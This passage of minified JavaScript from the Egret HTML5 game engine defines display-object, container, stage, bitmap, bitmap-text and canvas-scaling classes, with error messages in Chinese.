r=document.getElementById(e.canvas_div_name),s=this.width,o=this.height,a=s/i;n.width=i,n.height=o/a,n.style.width=s+"px",n.style.height=o+"px",r.style.width=s+"px",r.style.height=o+"px",t._scaleX=a,t._scaleY=a},i}(s),t.FixedSize=i,i.prototype.__class__="egret.FixedSize",i=function(t){function i(){t.call(this)}return __extends(i,t),i.prototype._apply=function(t,i,n){(i=document.getElementById(e.canvas_name)).style.width=i.width+"px",i.style.height=i.height+"px",t._scaleX=1,t._scaleY=1},i}(s),t.NoScale=i,i.prototype.__class__="egret.NoScale"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._originalData={},this._drawAreaList=[]}return __extends(i,e),i.getInstance=function(){return null==i.instance&&(i.instance=new i),i.instance},i.prototype.addDrawArea=function(t){this._drawAreaList.push(t)},i.prototype.clearDrawArea=function(){this._drawAreaList=[]},i.prototype.drawImage=function(e,i,n,r,s,o,a,h,l,p){a=a||0,h=h||0;var u=i._texture_to_render;if(null!=u&&0!=o&&0!=s&&0!=l&&0!=p)if(i._worldBounds){var d=this._originalData;d.sourceX=n,d.sourceY=r,d.sourceWidth=s,d.sourceHeight=o,d.destX=a,d.destY=h,d.destWidth=l,d.destHeight=p;for(var c=this.getDrawAreaList(),_=0;_<c.length;_++){var g=c[_];if(!this.ignoreRender(i,g,d.destX,d.destY)){if(0!=this._drawAreaList.length)if(0!=i._worldTransform.b||0!=i._worldTransform.c){if(i._worldBounds.x+d.destX<g.x||i._worldBounds.y+d.destY<g.y||i._worldBounds.x+i._worldBounds.width+d.destX>g.x+g.width||i._worldBounds.y+i._worldBounds.height+d.destY>g.y+g.height){t.Logger.fatal("请不要让带有旋转和斜切的显示对象跨过重绘区域");break}}else{var f,m=i._worldTransform.a,y=i._worldTransform.d;i._worldBounds.x+d.destX<g.x&&(f=(g.x-i._worldBounds.x)/m-d.destX,n+=f/(l/s),s-=f/(l/s),l-=f,a+=f),i._worldBounds.y+d.destY<g.y&&(f=(g.y-i._worldBounds.y)/y-d.destY,r+=f/(p/o),o-=f/(p/o),p-=f,h+=f),i._worldBounds.x+i._worldBounds.width+d.destX>g.x+g.width&&(f=(i._worldBounds.x+i._worldBounds.width-g.x-g.width)/m+d.destX,s-=f/(l/s),l-=f),i._worldBounds.y+i._worldBounds.height+d.destY>g.y+g.height&&(f=(i._worldBounds.y+i._worldBounds.height-g.y-g.height)/y+d.destY,o-=f/(p/o),p-=f)}e.drawImage(u,n,r,s,o,a,h,l,p)}}}else e.drawImage(u,n,r,s,o,a,h,l,p)},i.prototype.ignoreRender=function(t,e,i,n){var r=t._worldBounds;return i*=t._worldTransform.a,n*=t._worldTransform.d,r.x+r.width+i<=e.x||r.x+i>=e.x+e.width||r.y+r.height+n<=e.y||r.y+n>=e.y+e.height},i.prototype.getDrawAreaList=function(){var e;return 0==this._drawAreaList.length?(this._defaultDrawAreaList||(this._defaultDrawAreaList=[new t.Rectangle(0,0,t.MainContext.instance.stage.stageWidth,t.MainContext.instance.stage.stageHeight)]),e=this._defaultDrawAreaList):e=this._drawAreaList,e},i}(t.HashObject);t.RenderFilter=e,e.prototype.__class__="egret.RenderFilter"}(egret||(egret={})),function(t){var e=function(){function e(){}return e.mapClass=function(t,e,i){void 0===i&&(i=""),t=this.getKey(t)+"#"+i,this.mapClassDic[t]=e},e.getKey=function(e){return"string"==typeof e?e:t.getQualifiedClassName(e)},e.mapValue=function(t,e,i){void 0===i&&(i=""),t=this.getKey(t)+"#"+i,this.mapValueDic[t]=e},e.hasMapRule=function(t,e){void 0===e&&(e="");var i=this.getKey(t)+"#"+e;return!(!this.mapValueDic[i]&&!this.mapClassDic[i])},e.getInstance=function(t,e){void 0===e&&(e="");var i=this.getKey(t)+"#"+e;if(this.mapValueDic[i])return this.mapValueDic[i];var n=this.mapClassDic[i];if(n)return n=new n,this.mapValueDic[i]=n,delete this.mapClassDic[i],n;throw Error("调用了未配置的注入规则:"+i+"。 请先在项目初始化里配置指定的注入规则，再调用对应单例。")},e.mapClassDic={},e.mapValueDic={},e}();t.Injector=e,e.prototype.__class__="egret.Injector"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.NORMAL="normal",t.ADD="add",t.LAYER="layer",t}();t.BlendMode=e,e.prototype.__class__="egret.BlendMode"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._sizeDirty=this._normalDirty=!0,this._parent=null,this._cacheAsBitmap=!1,this._y=this._x=0,this._scaleY=this._scaleX=1,this._anchorY=this._anchorX=this._anchorOffsetY=this._anchorOffsetX=0,this._visible=!0,this._rotation=0,this._alpha=1,this._skewY=this._skewX=0,this._hasHeightSet=this._hasWidthSet=!1,this.worldAlpha=1,this._rectH=this._rectW=0,this._worldTransform=new t.Matrix,this._cacheBounds=new t.Rectangle(0,0,0,0)}return __extends(i,e),i.prototype._setDirty=function(){this._normalDirty=!0},i.prototype.getDirty=function(){return this._normalDirty||this._sizeDirty},i.prototype._setParentSizeDirty=function(){!this.parent||this.parent._hasWidthSet||this.parent._hasHeightSet||this.parent._setSizeDirty()},i.prototype._setSizeDirty=function(){this._sizeDirty||(this._sizeDirty=!0,this._setDirty(),this._setParentSizeDirty())},i.prototype._clearDirty=function(){this._normalDirty=!1},i.prototype._clearSizeDirty=function(){this._sizeDirty=!1},Object.defineProperty(i.prototype,"parent",{get:function(){return this._parent},enumerable:!0,configurable:!0}),i.prototype._parentChanged=function(t){this._parent=t},Object.defineProperty(i.prototype,"x",{get:function(){return this._x},set:function(e){t.NumberUtils.isNumber(e)&&(this._x=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"y",{get:function(){return this._y},set:function(e){t.NumberUtils.isNumber(e)&&(this._y=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"scaleX",{get:function(){return this._scaleX},set:function(e){t.NumberUtils.isNumber(e)&&(this._scaleX=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"scaleY",{get:function(){return this._scaleY},set:function(e){t.NumberUtils.isNumber(e)&&(this._scaleY=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"anchorOffsetX",{get:function(){return this._anchorOffsetX},set:function(e){t.NumberUtils.isNumber(e)&&(this._anchorOffsetX=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"anchorOffsetY",{get:function(){return this._anchorOffsetY},set:function(e){t.NumberUtils.isNumber(e)&&(this._anchorOffsetY=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"anchorX",{get:function(){return this._anchorX},set:function(e){t.NumberUtils.isNumber(e)&&(this._anchorX=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"anchorY",{get:function(){return this._anchorY},set:function(e){t.NumberUtils.isNumber(e)&&(this._anchorY=e,this._setDirty(),this._setParentSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"visible",{get:function(){return this._visible},set:function(t){this._visible=t,this._setSizeDirty()},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"rotation",{get:function(){return this._rotation},set:function(e){t.NumberUtils.isNumber(e)&&(this._rotation=e,this._setSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"alpha",{get:function(){return this._alpha},set:function(e){t.NumberUtils.isNumber(e)&&(this._alpha=e,this._setDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"skewX",{get:function(){return this._skewX},set:function(e){t.NumberUtils.isNumber(e)&&(this._skewX=e,this._setSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"skewY",{get:function(){return this._skewY},set:function(e){t.NumberUtils.isNumber(e)&&(this._skewY=e,this._setSizeDirty())},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"touchEnabled",{get:function(){return this._touchEnabled},set:function(t){this._touchEnabled=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"scrollRect",{get:function(){return this._scrollRect},set:function(t){this._scrollRect=t,this._setSizeDirty()},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"measuredWidth",{get:function(){return this._measureBounds().width},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"measuredHeight",{get:function(){return this._measureBounds().height},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"explicitWidth",{get:function(){return this._explicitWidth},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"explicitHeight",{get:function(){return this._explicitHeight},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"width",{get:function(){return this._getSize(t.Rectangle.identity).width},set:function(t){this._setWidth(t)},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"height",{get:function(){return this._getSize(t.Rectangle.identity).height},set:function(t){this._setHeight(t)},enumerable:!0,configurable:!0}),i.prototype._setWidth=function(e){this._setSizeDirty(),this._explicitWidth=e,this._hasWidthSet=t.NumberUtils.isNumber(e)},i.prototype._setHeight=function(e){this._setSizeDirty(),this._explicitHeight=e,this._hasHeightSet=t.NumberUtils.isNumber(e)},i.prototype._draw=function(t){if(this.visible&&!this.drawCacheTexture(t)){t.setAlpha(this.worldAlpha,this.blendMode),t.setTransform(this._worldTransform);var e=this.mask||this._scrollRect;e&&t.pushMask(e),this._render(t),e&&t.popMask()}this.destroyCacheBounds()},i.prototype.drawCacheTexture=function(e){if(this._cacheAsBitmap){var i=(s=this._texture_to_render)._offsetX,n=s._offsetY,r=s._textureWidth,s=s._textureHeight;this._updateTransform(),e.setAlpha(this.worldAlpha,this.blendMode),e.setTransform(this._worldTransform);var o=t.MainContext.instance.rendererContext.texture_scale_factor;return t.RenderFilter.getInstance().drawImage(e,this,0,0,r*o,s*o,i,n,r,s),!0}return!1},i.prototype._updateTransform=function(){this._worldTransform.identity().appendMatrix(this._parent._worldTransform);var t=this._getOffsetPoint();this._worldTransform.appendTransform(this._x,this._y,this._scaleX,this._scaleY,this._rotation,this._skewX,this._skewY,t.x,t.y),this._scrollRect&&this._worldTransform.append(1,0,0,1,-this._scrollRect.x,-this._scrollRect.y),this.worldAlpha=this._parent.worldAlpha*this._alpha},i.prototype._render=function(t){},i.prototype.getBounds=function(e){var i,n,r=this._measureBounds(),s=this._hasWidthSet?this._explicitWidth:r.width,o=this._hasHeightSet?this._explicitHeight:r.height,a=r.x,r=r.y;return 0!=this._anchorX||0!=this._anchorY?(i=s*this._anchorX,n=o*this._anchorY):(i=this._anchorOffsetX,n=this._anchorOffsetY),this._cacheBounds.initialize(a-i,r-n,s,o),s=this._cacheBounds,e||(e=new t.Rectangle),e.initialize(s.x,s.y,s.width,s.height)},i.prototype.destroyCacheBounds=function(){this._cacheBounds.x=0,this._cacheBounds.y=0,this._cacheBounds.width=0,this._cacheBounds.height=0},i.prototype._getConcatenatedMatrix=function(){for(var e=i.identityMatrixForGetConcatenated.identity(),n=this;null!=n;){if(0!=n._anchorX||0!=n._anchorY){var r=n._getSize(t.Rectangle.identity);e.prependTransform(n._x,n._y,n._scaleX,n._scaleY,n._rotation,n._skewX,n._skewY,r.width*n._anchorX,r.height*n._anchorY)}else e.prependTransform(n._x,n._y,n._scaleX,n._scaleY,n._rotation,n._skewX,n._skewY,n._anchorOffsetX,n._anchorOffsetY);n=n._parent}return e},i.prototype.localToGlobal=function(e,i,n){void 0===e&&(e=0),void 0===i&&(i=0);var r=this._getConcatenatedMatrix();return r.append(1,0,0,1,e,i),n||(n=new t.Point),n.x=r.tx,n.y=r.ty,n},i.prototype.globalToLocal=function(e,i,n){void 0===e&&(e=0),void 0===i&&(i=0);var r=this._getConcatenatedMatrix();return r.invert(),r.append(1,0,0,1,e,i),n||(n=new t.Point),n.x=r.tx,n.y=r.ty,n},i.prototype.hitTest=function(e,i,n){return void 0===n&&(n=!1),this.visible&&(n||this._touchEnabled)?(n=this._getSize(t.Rectangle.identity),0<=e&&e<n.width&&0<=i&&i<n.height?this.mask||this._scrollRect?this._scrollRect&&e<this._scrollRect.width&&i<this._scrollRect.height||this.mask&&this.mask.x<=e&&e<this.mask.x+this.mask.width&&this.mask.y<=i&&i<this.mask.y+this.mask.height?this:null:this:null):null},i.prototype.hitTestPoint=function(e,i,n){return e=this.globalToLocal(e,i),n?(this._hitTestPointTexture||(this._hitTestPointTexture=new t.RenderTexture),(n=this._hitTestPointTexture).drawToTexture(this),0!=n.getPixel32(e.x-this._hitTestPointTexture._offsetX,e.y-this._hitTestPointTexture._offsetY)[3]):!!this.hitTest(e.x,e.y,!0)},i.prototype._getMatrix=function(){var e=t.Matrix.identity.identity(),i=this._getOffsetPoint();return e.appendTransform(this._x,this._y,this._scaleX,this._scaleY,this._rotation,this._skewX,this._skewY,i.x,i.y),e},i.prototype._getSize=function(e){return this._hasHeightSet&&this._hasWidthSet?e.initialize(0,0,this._explicitWidth,this._explicitHeight):this._measureSize(t.Rectangle.identity)},i.prototype._measureSize=function(t){return this._sizeDirty?(t=this._measureBounds(),this._rectW=t.width,this._rectH=t.height,this._clearSizeDirty()):(t.width=this._rectW,t.height=this._rectH),t},i.prototype._measureBounds=function(){return t.Rectangle.identity.initialize(0,0,0,0)},i.prototype._getOffsetPoint=function(){var e=this._anchorOffsetX,i=this._anchorOffsetY;0==this._anchorX&&0==this._anchorY||(i=this._getSize(t.Rectangle.identity),e=this._anchorX*i.width,i=this._anchorY*i.height);var n=t.Point.identity;return n.x=e,n.y=i,n},i.prototype._onAddToStage=function(){this._stage=t.MainContext.instance.stage,t.DisplayObjectContainer.__EVENT__ADD_TO_STAGE_LIST.push(this)},i.prototype._onRemoveFromStage=function(){this._stage=null,t.DisplayObjectContainer.__EVENT__REMOVE_FROM_STAGE_LIST.push(this)},Object.defineProperty(i.prototype,"stage",{get:function(){return this._stage},enumerable:!0,configurable:!0}),i.prototype.addEventListener=function(n,r,s,o,a){void 0===o&&(o=!1),void 0===a&&(a=0),e.prototype.addEventListener.call(this,n,r,s,o,a),((o=n==t.Event.ENTER_FRAME)||n==t.Event.RENDER)&&this._insertEventBin(o?i._enterFrameCallBackList:i._renderCallBackList,r,s,a)},i.prototype.removeEventListener=function(n,r,s,o){void 0===o&&(o=!1),e.prototype.removeEventListener.call(this,n,r,s,o),((o=n==t.Event.ENTER_FRAME)||n==t.Event.RENDER)&&this._removeEventBin(o?i._enterFrameCallBackList:i._renderCallBackList,r,s)},i.prototype.dispatchEvent=function(t){if(!t._bubbles)return e.prototype.dispatchEvent.call(this,t);for(var i=[],n=this;n;)i.unshift(n),n=n.parent;for(var n=(r=i.length)-1,r=r-2;0<=r;r--)i.push(i[r]);return t._reset(),this._dispatchPropagationEvent(t,i,n),!t.isDefaultPrevented()},i.prototype._dispatchPropagationEvent=function(t,e,i){for(var n=e.length,r=0;r<n;r++){var s=e[r];if(t._setCurrentTarget(s),t._target=this,t._eventPhase=r<i?1:r==i?2:3,s._notifyListener(t),t._isPropagationStopped||t._isPropagationImmediateStopped)break}},i.prototype.willTrigger=function(t){for(var e=this;e;){if(e.hasEventListener(t))return!0;e=e._parent}return!1},Object.defineProperty(i.prototype,"cacheAsBitmap",{get:function(){return this._cacheAsBitmap},set:function(e){(this._cacheAsBitmap=e)?(this.renderTexture||(this.renderTexture=new t.RenderTexture),this.renderTexture.drawToTexture(this),this._texture_to_render=this.renderTexture):this._texture_to_render=null},enumerable:!0,configurable:!0}),i.getTransformBounds=function(t,e){var i,n,r=t.width,s=t.height,o=r*e.a,r=r*e.b,a=s*e.c,s=s*e.d,h=e.tx,l=e.ty,p=h,u=h,d=l,c=l;return(i=o+h)<p?p=i:i>u&&(u=i),(i=o+a+h)<p?p=i:i>u&&(u=i),(i=a+h)<p?p=i:i>u&&(u=i),(n=r+l)<d?d=n:n>c&&(c=n),(n=r+s+l)<d?d=n:n>c&&(c=n),(n=s+l)<d?d=n:n>c&&(c=n),t.initialize(p,d,u-p,c-d)},i.identityMatrixForGetConcatenated=new t.Matrix,i._enterFrameCallBackList=[],i._renderCallBackList=[],i}(t.EventDispatcher);t.DisplayObject=e,e.prototype.__class__="egret.DisplayObject"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._touchChildren=!0,this._children=[]}return __extends(i,e),Object.defineProperty(i.prototype,"touchChildren",{get:function(){return this._touchChildren},set:function(t){this._touchChildren=t},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"numChildren",{get:function(){return this._children.length},enumerable:!0,configurable:!0}),i.prototype.setChildIndex=function(t,e){this.doSetChildIndex(t,e)},i.prototype.doSetChildIndex=function(e,i){var n=this._children.indexOf(e);0>n&&t.Logger.fatal("child不在当前容器内"),this._children.splice(n,1),0>i||this._children.length<=i?this._children.push(e):this._children.splice(i,0,e)},i.prototype.addChild=function(t){var e=this.numChildren;return t._parent==this&&e--,this._doAddChild(t,e)},i.prototype.addChildAt=function(t,e){return this._doAddChild(t,e)},i.prototype._doAddChild=function(e,n,r){if(void 0===r&&(r=!0),e==this)return e;if(0>n||n>this._children.length)return t.Logger.fatal("提供的索引超出范围"),e;var s=e.parent;if(s==this)return this.doSetChildIndex(e,n),e;if(s&&s.removeChild(e),this._children.splice(n,0,e),e._parentChanged(this),r&&e.dispatchEventWith(t.Event.ADDED,!0),this._stage)for(e._onAddToStage(),n=i.__EVENT__ADD_TO_STAGE_LIST;0<n.length;)n.shift().dispatchEventWith(t.Event.ADDED_TO_STAGE);return e._setDirty(),this._setSizeDirty(),e},i.prototype.removeChild=function(e){return 0<=(e=this._children.indexOf(e))?this._doRemoveChild(e):(t.Logger.fatal("child未被addChild到该parent"),null)},i.prototype.removeChildAt=function(e){return 0<=e&&e<this._children.length?this._doRemoveChild(e):(t.Logger.fatal("提供的索引超出范围"),null)},i.prototype._doRemoveChild=function(e,n){void 0===n&&(n=!0);var r=this._children,s=r[e];if(n&&s.dispatchEventWith(t.Event.REMOVED,!0),this._stage){s._onRemoveFromStage();for(var o=i.__EVENT__REMOVE_FROM_STAGE_LIST;0<o.length;)o.shift().dispatchEventWith(t.Event.REMOVED_FROM_STAGE)}return s._parentChanged(null),r.splice(e,1),this._setSizeDirty(),s},i.prototype.getChildAt=function(e){return 0<=e&&e<this._children.length?this._children[e]:(t.Logger.fatal("提供的索引超出范围"),null)},i.prototype.contains=function(t){for(;t;){if(t==this)return!0;t=t._parent}return!1},i.prototype.swapChildrenAt=function(e,i){0<=e&&e<this._children.length&&0<=i&&i<this._children.length?this._swapChildrenAt(e,i):t.Logger.fatal("提供的索引超出范围")},i.prototype.swapChildren=function(e,i){var n=this._children.indexOf(e),r=this._children.indexOf(i);-1==n||-1==r?t.Logger.fatal("child未被addChild到该parent"):this._swapChildrenAt(n,r)},i.prototype._swapChildrenAt=function(t,e){if(t!=e){var i=this._children,n=i[t];i[t]=i[e],i[e]=n}},i.prototype.getChildIndex=function(t){return this._children.indexOf(t)},i.prototype.removeChildren=function(){for(var t=this._children.length-1;0<=t;t--)this._doRemoveChild(t)},i.prototype._updateTransform=function(){if(this.visible){e.prototype._updateTransform.call(this);for(var t=0,i=this._children.length;t<i;t++)this._children[t]._updateTransform()}},i.prototype._render=function(t){for(var e=0,i=this._children.length;e<i;e++)this._children[e]._draw(t)},i.prototype._measureBounds=function(){for(var e=0,i=0,n=0,r=0,s=this._children.length,o=0;o<s;o++){var a;if((h=this._children[o]).visible&&(a=t.DisplayObject.getTransformBounds(h._getSize(t.Rectangle.identity),h._getMatrix()))){var h=a.x,l=a.y,p=a.width+a.x,u=a.height+a.y;(h<e||0==o)&&(e=h),(p>i||0==o)&&(i=p),(l<n||0==o)&&(n=l),(u>r||0==o)&&(r=u)}}return t.Rectangle.identity.initialize(e,n,i-e,r-n)},i.prototype.hitTest=function(i,n,r){void 0===r&&(r=!1);var s;if(!this.visible)return null;if(this._scrollRect){if(0>i||0>n||i>this._scrollRect.width||n>this._scrollRect.height)return null}else if(this.mask&&(this.mask.x>i||i>this.mask.x+this.mask.width||this.mask.y>n||n>this.mask.y+this.mask.height))return null;for(var o=this._children,a=this._touchChildren,h=o.length-1;0<=h;h--){var l=o[h],p=l,u=p._getOffsetPoint(),d=p._x,c=p._y;if(this._scrollRect&&(d-=this._scrollRect.x,c-=this._scrollRect.y),(p=t.Matrix.identity.identity().prependTransform(d,c,p._scaleX,p._scaleY,p._rotation,0,0,u.x,u.y)).invert(),p=t.Matrix.transformCoords(p,i,n),l=l.hitTest(p.x,p.y,!0)){if(l._touchEnabled&&a)return l;if(this._touchEnabled)return this;null==s&&(s=l)}}return s||e.prototype.hitTest.call(this,i,n,r)},i.prototype._onAddToStage=function(){e.prototype._onAddToStage.call(this);for(var t=this.numChildren,i=0;i<t;i++)this._children[i]._onAddToStage()},i.prototype._onRemoveFromStage=function(){e.prototype._onRemoveFromStage.call(this);for(var t=this.numChildren,i=0;i<t;i++)this._children[i]._onRemoveFromStage()},i.prototype.getChildByName=function(t){for(var e,i=this._children,n=this.numChildren,r=0;r<n;r++)if((e=i[r]).name==t)return e;return null},i.__EVENT__ADD_TO_STAGE_LIST=[],i.__EVENT__REMOVE_FROM_STAGE_LIST=[],i}(t.DisplayObject);t.DisplayObjectContainer=e,e.prototype.__class__="egret.DisplayObjectContainer"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t,i){void 0===t&&(t=480),void 0===i&&(i=800),e.call(this),this.touchEnabled=!0,this._stage=this,this._stageWidth=t,this._stageHeight=i}return __extends(i,e),i.prototype.invalidate=function(){i._invalidateRenderFlag=!0},Object.defineProperty(i.prototype,"scaleMode",{get:function(){return this._scaleMode},set:function(e){if(this._scaleMode!=e){this._scaleMode=e;var i={};if(i[t.StageScaleMode.NO_SCALE]=new t.NoScale,i[t.StageScaleMode.SHOW_ALL]=new t.FixedWidth,!(e=i[e]))throw Error("使用了尚未实现的ScaleMode");i=new t.EqualToFrame,e=new t.ResolutionPolicy(i,e),t.StageDelegate.getInstance()._setResolutionPolicy(e),e=document.getElementById(t.StageDelegate.canvas_name),this._stageWidth=e.width,this._stageHeight=e.height,this.dispatchEventWith(t.Event.RESIZE)}},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"stageWidth",{get:function(){return this._stageWidth},enumerable:!0,configurable:!0}),Object.defineProperty(i.prototype,"stageHeight",{get:function(){return this._stageHeight},enumerable:!0,configurable:!0}),i.prototype.hitTest=function(e,i){if(!this.touchEnabled)return null;var n;if(!this.visible)return this;for(var r=this._children,s=r.length-1;0<=s;s--){var o=n=r[s],a=o._getOffsetPoint();if((o=t.Matrix.identity.identity().prependTransform(o.x,o.y,o.scaleX,o.scaleY,o.rotation,0,0,a.x,a.y)).invert(),o=t.Matrix.transformCoords(o,e,i),(n=n.hitTest(o.x,o.y,!0))&&n.touchEnabled)return n}return this},i.prototype.getBounds=function(e){return e||(e=new t.Rectangle),e.initialize(0,0,this._stageWidth,this._stageHeight)},i.prototype._updateTransform=function(){for(var t=0,e=this._children.length;t<e;t++)this._children[t]._updateTransform()},i._invalidateRenderFlag=!1,i}(t.DisplayObjectContainer);t.Stage=e,e.prototype.__class__="egret.Stage"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.NO_SCALE="noScale",t.SHOW_ALL="showAll",t}();t.StageScaleMode=e,e.prototype.__class__="egret.StageScaleMode"}(egret||(egret={})),function(t){var e=function(){function t(){}return t.REPEAT="repeat",t.SCALE="scale",t}();t.BitmapFillMode=e,e.prototype.__class__="egret.BitmapFillMode"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){e.call(this),this.debug=!1,this.debugColor=16711680,this.fillMode="scale",t&&(this._texture=t,this._setSizeDirty())}return __extends(i,e),Object.defineProperty(i.prototype,"texture",{get:function(){return this._texture},set:function(t){t!=this._texture&&(this._setSizeDirty(),this._texture=t)},enumerable:!0,configurable:!0}),i.prototype._render=function(t){var e=this._texture;e?(this._texture_to_render=e,i._drawBitmap(t,this._hasWidthSet?this._explicitWidth:e._textureWidth,this._hasHeightSet?this._explicitHeight:e._textureHeight,this)):this._texture_to_render=null},i._drawBitmap=function(e,n,r,s){var o=s._texture_to_render;if(o){var a=o._textureWidth,h=o._textureHeight;if("scale"==s.fillMode){if((l=s.scale9Grid||o.scale9Grid)&&a-l.width<n&&h-l.height<r)i.drawScale9GridImage(e,s,l,n,r);else{var l=o._offsetX,p=o._offsetY,u=o._bitmapWidth||a,d=o._bitmapHeight||h;n/=a,l=Math.round(l*n),n=Math.round(u*n),r/=h,p=Math.round(p*r),r=Math.round(d*r),t.RenderFilter.getInstance().drawImage(e,s,o._bitmapX,o._bitmapY,u,d,l,p,n,r)}}else i.drawRepeatImage(e,s,n,r)}},i.drawRepeatImage=function(e,i,n,r){if(d=i._texture_to_render)for(var s=d._textureWidth,o=d._textureHeight,a=d._bitmapX,h=d._bitmapY,l=d._bitmapWidth||s,p=d._bitmapHeight||o,u=d._offsetX,d=d._offsetY,c=t.RenderFilter.getInstance();u<n;u+=s)for(var _=d;_<r;_+=o){var g=Math.min(l,n-u),f=Math.min(p,r-_);c.drawImage(e,i,a,h,l,p,u,_,g,f)}},i.drawScale9GridImage=function(e,i,n,r,s){if((_=i._texture_to_render)&&n){var o=t.RenderFilter.getInstance(),a=_._textureWidth,h=_._textureHeight,l=_._bitmapX,p=_._bitmapY,u=_._bitmapWidth||a,d=_._bitmapHeight||h,c=_._offsetX,_=_._offsetY;n=t.Rectangle.identity.initialize(n.x-Math.round(c),n.y-Math.round(c),n.width,n.height),c=Math.round(c),_=Math.round(_),r-=a-u,s-=h-d,n.y==n.bottom&&(n.bottom<d?n.bottom++:n.y--),n.x==n.right&&(n.right<u?n.right++:n.x--);var a=l+n.x,h=l+n.right,g=u-n.right,f=p+n.y,m=p+n.bottom,y=d-n.bottom,v=c+n.x,E=_+n.y,d=s-(d-n.bottom),u=r-(u-n.right);o.drawImage(e,i,l,p,n.x,n.y,c,_,n.x,n.y),o.drawImage(e,i,a,p,n.width,n.y,v,_,u-n.x,n.y),o.drawImage(e,i,h,p,g,n.y,c+u,_,r-u,n.y),o.drawImage(e,i,l,f,n.x,n.height,c,E,n.x,d-n.y),o.drawImage(e,i,a,f,n.width,n.height,v,E,u-n.x,d-n.y),o.drawImage(e,i,h,f,g,n.height,c+u,E,r-u,d-n.y),o.drawImage(e,i,l,m,n.x,y,c,_+d,n.x,s-d),o.drawImage(e,i,a,m,n.width,y,v,_+d,u-n.x,s-d),o.drawImage(e,i,h,m,g,y,c+u,_+d,r-u,s-d)}},i.prototype._measureBounds=function(){var i=this._texture;return i?t.Rectangle.identity.initialize(i._offsetX,i._offsetY,i._textureWidth,i._textureHeight):e.prototype._measureBounds.call(this)},i.debug=!1,i}(t.DisplayObject);t.Bitmap=e,e.prototype.__class__="egret.Bitmap"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(){e.call(this),this._text="",this._textChanged=!1,this._bitmapPool=[]}return __extends(i,e),Object.defineProperty(i.prototype,"text",{get:function(){return this._text},set:function(t){this._textChanged=!0,this._text=t},enumerable:!0,configurable:!0}),i.prototype._updateTransform=function(){this.visible&&(this._textChanged&&this._renderText(),e.prototype._updateTransform.call(this))},i.prototype._renderText=function(e){var i=e=0;this._textChanged&&this.removeChildren();for(var n=0,r=this.text.length;n<r;n++){var s=this.text.charAt(n),o=this.spriteSheet.getTexture(s);if(null==o)console.log("当前没有位图文字："+s);else{var s=o._offsetX,a=o._offsetY,h=o._textureWidth;if(this._textChanged){var l=this._bitmapPool[n];l||(l=new t.Bitmap,this._bitmapPool.push(l)),l.texture=o,this.addChild(l),l.x=e}e+=h+s,a+o._textureHeight>i&&(i=a+o._textureHeight)}}return this._textChanged=!1,t.Rectangle.identity.initialize(0,0,e,i)},i.prototype._measureBounds=function(){return this._renderText(!0)},i}(t.DisplayObjectContainer);t.BitmapText=e,e.prototype.__class__="egret.BitmapText"}(egret||(egret={})),function(t){var e=function(){function t(){this.commandQueue=[]}return t.prototype.beginFill=function(t,e){},t.prototype._setStyle=function(t){},t.prototype.drawRect=function(t,e,i,n){},t.prototype.drawCircle=function(t,e,i){},t.prototype.lineStyle=function(t,e,i,n,r,s,o,a){},t.prototype.lineTo=function(t,e){},t.prototype.curveTo=function(t,e,i,n){},t.prototype.moveTo=function(t,e){},t.prototype.clear=function(){},t.prototype.endFill=function(){},t.prototype._draw=function(t){},t}();t.Graphics=e,e.prototype.__class__="egret.Graphics",function(t,e,i){this.method=t,this.thisObject=e,this.args=i}.prototype.__class__="Command"}(egret||(egret={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in 